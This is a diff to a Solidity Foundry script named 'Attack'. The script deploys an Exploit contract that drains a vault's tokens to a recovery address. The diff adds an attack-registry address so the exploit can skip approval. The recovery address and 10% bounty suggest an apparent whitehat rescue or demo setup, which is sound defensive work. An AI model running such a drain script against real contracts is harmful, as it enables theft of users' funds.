@@ -18,6 +18,7 @@ import {Exploit} from "../src/Exploit.sol";
 ///   just attack-browser    # your own wallet (MetaMask/Trezor)
 contract Attack is Script {
     address constant MOCK_REGISTRY_MODERATOR = 0x3DdA228A38b4d7438bBF5D5137c8D1090DcaF6bF;
+    address constant DEFAULT_ATTACK_REGISTRY = 0x22134e878c409a0Eab7259d873b38e26Ca966d3C;
     uint256 constant BOUNTY_BPS = 1_000; // 10% — display only; keep in sync with Attacker.BOUNTY_BPS
 
     function run() external {
@@ -25,13 +26,15 @@ contract Attack is Script {
         address token = vm.envAddress("TOKEN_ADDRESS");
         address recovery = vm.envAddress("RECOVERY_ADDRESS");
         address agreement = vm.envAddress("AGREEMENT_ADDRESS");
+        // Lets the Exploit skip approval if the agreement is already UNDER_ATTACK.
+        address registry = vm.envOr("ATTACK_REGISTRY", DEFAULT_ATTACK_REGISTRY);
 
         uint256 vaultBefore = IERC20(token).balanceOf(vault);
         console.log("Vault balance before:", vaultBefore / 1e18, "tokens");
         console.log("Deploying Exploit (approves attack mode + drains in one tx)...");
 
         vm.startBroadcast();
-        new Exploit(vault, recovery, agreement, MOCK_REGISTRY_MODERATOR);
+        new Exploit(vault, recovery, agreement, MOCK_REGISTRY_MODERATOR, registry);
         vm.stopBroadcast();
 
         uint256 vaultAfter = IERC20(token).balanceOf(vault);
